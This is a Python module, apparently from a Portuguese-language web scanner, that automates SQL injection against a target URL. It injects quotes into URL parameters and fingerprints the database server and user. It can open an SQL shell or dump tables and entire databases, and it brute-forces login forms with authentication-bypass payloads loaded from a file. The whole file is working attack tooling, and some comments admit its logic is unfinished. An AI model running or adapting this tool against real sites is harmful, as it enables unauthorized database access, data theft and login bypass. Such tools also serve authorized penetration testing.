# !/usr/bin/env python3
''''''
from datetime import datetime
from core.config import INITIAL_COUNT_VALUE, INITIAL_FORM_COUNT_VALUE, TARGET_VULNERABLE
from mode.plugin.models import WebSpiderExceptions
from mode.plugin.models import info

def _sqlInjection(target_url, response, _shell, _dump_tables, _dump_all, bypass_auth):
    try:
        try:
            from core import colors as color
            from core.utils import avaregeTime
            from core.config import AVARAGE_TIME_BASED_SQLI
            from bs4 import BeautifulSoup
            from core.utils import urlExplode
            from core.utils import exitTheProgram
            from mode.plugin.dbfingerprint import _dbFingerprint
            from mode.plugin.dbfingerprint import _serverVersion
            from mode.plugin.dbfingerprint import _getDatabaseNameU
            from mode.plugin.models import modeBanner
            import re
            import requests
            
            modeBanner(target_url=target_url, mode="injeção sql")
            from core.utils import checkURLIntegrity
            checkURLIntegrity(target_url)         
            from mode.plugin.models import checkEstability
            checkEstability()
            if(avaregeTime(target_url) >= AVARAGE_TIME_BASED_SQLI):
                from mode.plugin.models import notStable
                notStable()
                user_option = str(input(" Deseja continuar? (sim/nao): "))
                if user_option.lower() == 'sim':
                    pass
                elif user_option.lower() == 'nao':
                    from mode.plugin.models import endingTest
                    endingTest()
                    exitTheProgram()
                else:
                    from mode.plugin.models import inputError
                    inputError()
                    exitTheProgram()
            else:
                from mode.plugin.models import stableConnection
                stableConnection()
                pass 
            try:
                from mode.plugin.models import checkURLVariables
                checkURLVariables()
                para = re.compile('(=)\w+')
                if para.search(target_url):
                        try:
                            splited_para = para.search(target_url).group()
                            exploited_target_url = target_url.replace(splited_para, splited_para+"'")
                            requesicao = requests.head(url=exploited_target_url)
                            requesicao = requests.post(url=exploited_target_url)
                            
                            '''Fingerprinting database '''
                            from mode.plugin.models import fingerprintDatabase
                            fingerprintDatabase(parameter="colunas")
                            current_table_cullumns_number = _dbFingerprint(target_url)
                            fingerprintDatabase(parameter="server")
                            server_fingerprint = _serverVersion(target_url, current_table_cullumns_number)
                            
                            '''veriffica pra caso haja valores no array do fingerprint do servidor'''
                            if server_fingerprint:
                                pass
                            else:
                                server_fingerprint[1] = "Não encontrado";
                                server_fingerprint[2] = "Não encontrado";
                            fingerprintDatabase(parameter="database")
                            database_user_fingerprint = _getDatabaseNameU(target_url, current_table_cullumns_number)
                            fingerprintDatabase(parameter="SGBD")          
                            if 'mysql' in requesicao.text.lower():
                                ## mostra o relatório em relação ao fingerprint do servidor
                                print("\n ----------")
                                header_list = ['Server', 'Date', 'Via', 'X-Powered-By', 'X-Contry-Code', 'Sec-Ch-Ua-Platform']
                                for header_perc in header_list:
                                    try:
                                        result = requesicao.headers[header_perc]
                                        print("\t%s: %s  " % (header_perc, result))
                                    except Exception as error:
                                        print("\t%s : não encontrado" % header_perc)
                                try:    
                                    from mode.plugin.models import sqliRepport
                                    sqliRepport(SGBD=server_fingerprint[1], SO=server_fingerprint[2], DB_USER=database_user_fingerprint[2], DB_NAME=database_user_fingerprint[1]) 
                                except KeyError:
                                    fingerprintDatabase(parameter="status")
                                    pass
                                print(" ----------")
                                if not _shell and not _dump_tables and not _dump_all:
                                    '''termino do relatório'''
                                    from mode.plugin.tablesEnum import simpleTest      
                                    simpleTest(target_url)                             
                                else:
                                    pass
                                try:
                                    database_user_fingerprint[2] = database_user_fingerprint[2].split('@' )
                                except KeyError as e:
                                    database_user_fingerprint[2] = "Não encontrada"
                                    pass
                                if _shell:
                                    from mode.plugin.tablesEnum import sqlShell
                                    sqlShell(target_url)
                                if _dump_tables:
                                    from mode.plugin.tablesEnum import dump_tables
                                    dump_tables(target_url)
                                if _dump_all:
                                    from mode.plugin.tablesEnum import dumpAll
                                    dumpAll(target_url);    '''enumera todas as tables do banco de dados'''
                                exitTheProgram()
                            else:
                                from mode.plugin.alien import alien
                                alien(_shell, _dump_tables, _dump_all, target_url)
                        except FileNotFoundError as e:
                            WebSpiderExceptions(type="FileNotFoundError")
                            exitTheProgram()
                else:
                    '''Faz o teste sqli nos campos de formulários filtrados '''
                    from mode.plugin.models import fingerprintDatabase
                    fingerprintDatabase(parameter="id not found")
                    main_requesition = requests.get(url=target_url)
                    main_requesition_parsed = BeautifulSoup(main_requesition.content, 'html.parser')
                    forms = main_requesition_parsed.find_all('form')
                    if forms:
                        if response:
                            info(parameter="1")
                            pass
                        elif bypass_auth:
                            info(parameter="2")
                            exitTheProgram()
                        elif response and bypass_auth:
                            pass
                        else:
                            if _shell:
                                from mode.plugin.tablesEnum import sqlShell
                                sqlShell(target_url)
                            elif _dump_tables:
                                from mode.plugin.tablesEnum import dump_tables
                                dump_tables(target_url)
                            elif _dump_all:
                                from mode.plugin.tablesEnum import dumpAll
                                dumpAll(target_url)
                            else:
                                from mode.plugin.tablesEnum import simpleTest      
                                simpleTest(target_url)                             
                                exitTheProgram()                                   
                    else:
                        info(parameter="3")
            
                    form_quant = -1
                    array_form = {}
                    input_dic  = {}
                    validation_page = {} 
                    succed_payloads = []
                    url_exploded = urlExplode(target_url)
                    for form_perc in forms:
                        form_quant += 1
                        if 'action' in form_perc.attrs:
                            validation_page[form_quant] = form_perc['action']
                        array_form[form_quant] = form_perc     
                    print("["+color.green+"+"+color.end+"]"+color.end+"["+color.admin_side, datetime.now(), color.end+"]  Foi encontrado [0 - (%s)] formulários." % (form_quant), end='')
                    if form_quant == INITIAL_COUNT_VALUE:
                        form_quant = 1  
                        user_option = 0
                    else:
                        try:
                            user_option = int(input(" Qual a posição do formulário que desejas testar?: "))
                        except ValueError as e:
                            WebSpiderExceptions(type="ValueError")
                        if user_option > form_quant or user_option < 0:
                            print(color.red+"[!][", datetime.now(), "]  Erro: Quantidade inválida."+color.end)
                            exitTheProgram()
                        else:
                            pass
                    for user_option_perc in range(INITIAL_FORM_COUNT_VALUE):
                                post_target_url = url_exploded[0]+'//'+url_exploded[2]+'/'+validation_page[user_option]
                                from mode.plugin.models import inputFiltering
                                inputFiltering(position=user_option)
                                input_tag = array_form[user_option].find_all({'input'})
                                ''' testa a existencia da interação da página de login, caso não seja passada, solicite que se passe'''
                                print("["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]  Testando "+color.cian+" Injeção inferencial(CEGA) BYPASS AUTH BOOLEAN "+color.end)
                                with open ('./mode/payload/bypass_auth_payloads_sqli', 'r') as bypass_auth_payloads_sqli:
                                    for lines in bypass_auth_payloads_sqli:
                                        for input_tag_perc in input_tag:
                                            if 'type' in input_tag_perc.attrs:
                                                if 'checkbox' in input_tag_perc.attrs['type']:
                                                    pass
                                                elif 'name' in input_tag_perc.attrs:
                                                    input_dic[input_tag_perc.attrs['name']] = lines
                                        main_requesition = requests.post(url=post_target_url, data=input_dic)
                                        '''alguns servidores mal configuradas, ou páginas, não enviam o cabeçalho http Set-cookie logo na primeira requisão
                                        a página de login, só depois de usuário estiver aunteticado, podemos nos aproveitar dessa falha e testarmos a autenti-
                                        cidade dos payloads'''
                                        if 'Set-Cookie' in main_requesition.headers:
                                            ## ver bem essa lógica... não funcionando ainda em condições
                                            if response not in main_requesition.text.lower(): 
                                                print("["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]["+color.admin_side+"Viável"+color.end+"]  MYSQLi BYPASS AUTH BOOLEAN "+ color.cian, lines+color.end, end='')
                                                succed_payloads.append(lines)
                                                break
                                            else:
                                                print("["+color.red+"-"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]["+color.red+"Bloqueado"+color.end+"] MYSQLi BYPASS AUTH BOOLEAN"+ color.cian, lines+color.end, end='')
                                        else:
                                            ## ver bem essa lógica... não funcionando ainda em condições
                                            if response not in main_requesition.text.lower() and lines not in main_requesition.text.lower():
                                                print("["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]["+color.admin_side+"Viável"+color.end+"]  MYSQLi BYPASS AUTH BOOLEAN "+ color.cian, lines+color.end, end='')
                                                succed_payloads.append(lines)
                                                break
                                            else:
                                                print("["+color.red+"-"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]["+color.red+"Bloqueado"+color.end+"] MYSQLi BYPASS AUTH BOOLEAN"+ color.cian, lines+color.end, end='')
                                '''secção de relatórios de teste'''          
                                print("\n O Web spider detetou os seguintes pontos de injeção no alvo:")
                                for succed_payloads_lines in succed_payloads:
                                    print("\t Título: MYSQLi BYPASS AUTH BOOLEAN :: Payload: %s" %succed_payloads_lines, end='')
                                    for index, value in input_dic.items():
                                        print("\t Variávei url: %s"%index)
                                print(color.cian+"Estado:: Alvo Vulnerável")
                                exitTheProgram()
            except requests.exceptions.RequestException as e:
                WebSpiderExceptions(type="requests.exceptions.RequestException")
        except ImportError as e:
            WebSpiderExceptions(type="ImportError")
    except KeyboardInterrupt as e:
        WebSpiderExceptions(type="KeyboardInterrupt")